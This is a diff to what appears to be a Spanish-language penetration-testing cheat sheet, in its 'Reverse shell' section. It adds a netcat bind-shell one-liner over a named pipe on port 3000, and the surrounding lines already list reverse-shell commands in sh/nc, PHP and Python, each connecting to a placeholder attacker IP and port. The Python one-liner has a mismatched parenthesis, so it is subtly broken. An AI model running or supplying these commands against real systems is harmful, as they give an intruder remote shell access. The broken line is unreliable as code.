@@ -46,6 +46,8 @@ Reverse shell
     /bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe
     O probar también
     /bin/sh -c "/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe"
+    O también (bind)
+    mkfifo /tmp/rfsfu; (nc -l -p 3000 || nc -l 3000)0</tmp/rfsfu | /bin/sh >/tmp/rfsfu 2>&1; rm /tmp/rfsfu
     ---
     php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
